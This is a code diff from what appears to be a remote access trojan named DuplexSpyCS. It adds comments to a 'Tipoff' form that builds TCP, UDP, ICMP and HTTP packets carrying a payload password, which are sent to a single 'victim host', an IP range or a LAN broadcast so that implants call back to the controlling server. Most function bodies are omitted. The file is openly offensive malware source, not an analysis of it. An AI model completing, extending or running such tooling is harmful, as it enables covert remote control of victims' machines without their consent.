@@ -20,14 +20,39 @@ namespace DuplexSpyCS
 {
     public partial class frmTipoff : Form
     {
+        /* .o0o.---------------[ README ]---------------.o0o.
+         * Tipoff packet sender.
+         * 
+         * Introduction:
+         * Send packet with payload password to remote victim host.
+         * 
+         * Done:
+         * Build TCP packet.
+         * Build UDP packet.
+         * Build ICMP packet.
+         * Build HTTP packet.
+         * 
+         * Todo:
+         * Debug.
+         * 
+         * .o0o.---------------[ README ]---------------.o0o.
+         */
+
         private Listener m_listener;
 
+        /// <summary>
+        /// Send request mode.
+        /// </summary>
         private enum RequestMode
         {
-            Single,
-            Multiple,
-            LAN,
+            Single, //Send packet to single host.
+            Multiple, //Send packet to multiple host(IP range.)
+            LAN, //Boardcast packet to LAN.
         }
+
+        /// <summary>
+        /// Packet protocol.
+        /// </summary>
         private enum RequestProtocol
         {
             TCP,
@@ -35,6 +60,10 @@ namespace DuplexSpyCS
             ICMP,
             HTTP,
         }
+
+        /// <summary>
+        /// HTTP request action.
+        /// </summary>
         private enum HttpAction
         {
             GET,
@@ -56,6 +85,20 @@ namespace DuplexSpyCS
         private RequestMode fnGetRequestMode() => (RequestMode)Enum.Parse(typeof(RequestMode), comboBox2.Text);
         private RequestProtocol fnGetRequestProtocol() => (RequestProtocol)Enum.Parse(typeof(RequestProtocol), comboBox1.Text);
 
+        /// <summary>
+        /// Build TCP Packet.
+        /// </summary>
+        /// <param name="nPortCallback">DuplexSpy server listening port.</param>
+        /// <param name="nDestPort">Destination victim port.</param>
+        /// <param name="nWndSize">TCP packet window size.</param>
+        /// <param name="bSYN">Set SYN flag to 1.</param>
+        /// <param name="bACK">Set ACK flag to 1.</param>
+        /// <param name="bFIN">Set FIN flag to 1.</param>
+        /// <param name="bPUSH">Set PUSH flag to 1.</param>
+        /// <param name="bRST">Set RST flag to 1.</param>
+        /// <param name="bURG">Set URG flag to 1.</param>
+        /// <param name="szPassword">Payload password.</param>
+        /// <returns>Tipoff request TCP packet.</returns>
         private TcpPacket fnBuildTcpPacket
         (
             int nPortCallback,
@@ -85,6 +128,14 @@ namespace DuplexSpyCS
 
             return pktTCP;
         }
+
+        /// <summary>
+        /// Build UDP Packet.
+        /// </summary>
+        /// <param name="nPortCallback">DuplexSpy server listening port.</param>
+        /// <param name="nDestPort">Destination victim port.</param>
+        /// <param name="szPassword">Payload password.</param>
+        /// <returns>Tipoff request UDP packet.</returns>
         private UdpPacket fnBuildUdpPacket
         (
             int nPortCallback,
@@ -98,6 +149,14 @@ namespace DuplexSpyCS
 
             return pktUDP;
         }
+
+        /// <summary>
+        /// Build ICMP Packet.
+        /// </summary>
+        /// <param name="nTypeCode">ICMP Type.</param>
+        /// <param name="nCode">ICMP Code.</param>
+        /// <param name="nPort">DuplexSpy server listening port.</param>
+        /// <returns>Tipoff request ICMP packet.</returns>
         private IcmpV4Packet fnBuildIcmpPacket
         (
             int nTypeCode,
@@ -112,6 +171,18 @@ namespace DuplexSpyCS
 
             return pktICMP;
         }
+
+        /// <summary>
+        /// Build HTTP Packet.
+        /// </summary>
+        /// <param name="nPortCallback"></param>
+        /// <param name="nDestPort"></param>
+        /// <param name="httpAction"></param>
+        /// <param name="szDomain"></param>
+        /// <param name="szPage"></param>
+        /// <param name="szUA"></param>
+        /// <param name="szPassword"></param>
+        /// <returns></returns>
         private TcpPacket fnBuildHttpPacket
         (
             int nPortCallback,
@@ -141,6 +212,9 @@ namespace DuplexSpyCS
             return pkt;
         }
 
+        /// <summary>
+        /// Send Tipoff Request Packet.
+        /// </summary>
         private void fnTipoffRequest()
         {
             string szPassword = textBox11.Text;
